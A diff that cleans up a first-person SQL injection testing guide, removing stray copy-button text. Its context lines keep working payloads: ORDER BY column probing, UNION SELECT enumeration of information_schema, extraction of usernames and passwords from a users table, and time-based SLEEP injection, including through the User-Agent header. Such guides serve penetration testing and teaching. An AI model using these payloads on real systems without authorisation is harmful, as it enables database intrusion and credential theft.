@@ -24,9 +24,6 @@ Example:
 id=2
 id=2-1
 
-yaml
-Копировать код
-
 If the application returns the same object (e.g. record with id=1),
 this indicates unsanitized input and potential SQL evaluation.
 
@@ -40,9 +37,6 @@ Examples:
 '
 "
 ')(
-
-yaml
-Копировать код
 
 I look for:
 - SQL error messages
@@ -60,8 +54,6 @@ order_id=1 ORDER BY 1
 order_id=1 ORDER BY 2
 order_id=1 ORDER BY 3
 
-yaml
-Копировать код
 
 When the response breaks, I know the column limit.
 
@@ -74,8 +66,6 @@ Once column count is known, I test UNION SELECT.
 Example:
 order_id=-1 UNION SELECT 1,2,3,4 --
 
-yaml
-Копировать код
 
 I identify:
 - which columns are reflected
@@ -91,16 +81,12 @@ After identifying a reflected column, I enumerate database metadata.
 UNION SELECT 1,2,group_concat(table_name),4
 FROM information_schema.tables --
 
-shell
-Копировать код
 
 ### Columns
 UNION SELECT 1,2,group_concat(column_name),4
 FROM information_schema.columns
 WHERE table_name='users' --
 
-yaml
-Копировать код
 
 ---
 
@@ -111,9 +97,6 @@ Finally, I extract actual application data.
 Example:
 UNION SELECT 1,2,username,4 FROM users --
 UNION SELECT 1,2,password,4 FROM users --
-
-yaml
-Копировать код
 
 At this stage the vulnerability is confirmed.
 
@@ -133,8 +116,6 @@ shell
 ### Time-based
 id=1 AND SLEEP(5)
 
-yaml
-Копировать код
 
 Response timing differences confirm injection.
 
@@ -150,8 +131,6 @@ I also test:
 Example:
 User-Agent: ' OR SLEEP(5)--
 
-yaml
-Копировать код
 
 ---
 
